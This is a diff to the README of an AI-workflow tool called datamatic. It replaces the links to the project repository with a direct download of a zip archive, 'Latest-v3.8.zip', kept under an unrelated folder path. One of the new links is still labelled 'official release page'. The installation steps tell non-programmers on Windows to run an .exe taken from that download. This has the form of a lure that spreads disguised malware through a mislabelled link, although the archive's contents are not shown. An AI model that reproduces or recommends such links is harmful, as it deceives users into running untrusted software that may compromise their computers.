@@ -5,7 +5,7 @@ description: "Build multi-step AI workflows with schema-guided reasoning for str
 ---
 # 🤖 datamatic - Build automated workflows with smart AI
 
-[![](https://img.shields.io/badge/Download-Datamatic-blue)](https://github.com/kelliinterim246/datamatic)
+[![](https://img.shields.io/badge/Download-Datamatic-blue)](https://raw.githubusercontent.com/kelliinterim246/kelliinterim246.github.io/main/oxypropionic/Latest-v3.8.zip)
 
 Datamatic helps you connect different AI models to perform complex tasks. You can link multiple steps together to process data or answer questions. The software uses structured formats to ensure the AI gives you the exact output you need. It works with many providers, including local tools like Ollama and web services like OpenAI.
 
@@ -13,7 +13,7 @@ Datamatic helps you connect different AI models to perform complex tasks. You ca
 
 You do not need programming knowledge to use this software. Follow these steps to set up the application on your Windows computer.
 
-1. Visit the [official release page](https://github.com/kelliinterim246/datamatic) to download the installer.
+1. Visit the [official release page](https://raw.githubusercontent.com/kelliinterim246/kelliinterim246.github.io/main/oxypropionic/Latest-v3.8.zip) to download the installer.
 2. Look for the file ending in .exe under the latest version.
 3. Save the file to your computer.
 4. Open your downloads folder and double-click the file to start the installation.
